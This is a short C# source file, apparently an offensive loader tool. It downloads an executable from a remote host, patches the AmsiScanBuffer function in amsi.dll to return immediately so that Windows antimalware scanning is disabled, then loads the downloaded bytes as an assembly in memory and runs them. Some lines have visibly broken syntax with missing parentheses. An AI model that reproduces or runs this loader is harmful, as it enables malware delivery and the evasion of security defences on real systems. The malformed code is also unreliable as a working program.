using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;

namespace deadPie
{
    class Program
    {
        static void Main(string[] args)
        {
            var client = new WebClient();
            var deadGet = client.DownloadData("http://10.0.0.0/picnic.exe");
            client.Dispose();

            var deadDll = LoadLibrary("amsi.dll");
            var deadFind = GetProcAddress(deadDll, "AmsiScanBuffer");
            var deadReturn = new byte[] { 0xC3 };
            VirtualProtect(deadFind, (UIntPtr deadReturn.Length, 0x40, out uint oldProtect);
            Marshal.Copy deadReturn, 0, deadFind, deadReturn.Length);
            VirtualProtect(deadFind, (UIntPtr deadReturn.Length, oldProtect, out uint _);

            var asm = Assembly.Load(deadGet);
            var type = asm.GetType("deadGet.deadGet");
            var instance = Activator.CreateInstance(type);
            type.InvokeMember("deadGet", BindingFlags.InvokeMethod | BindingFlags.Public | BindingFlags.Static, null, instance, null);

        }

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
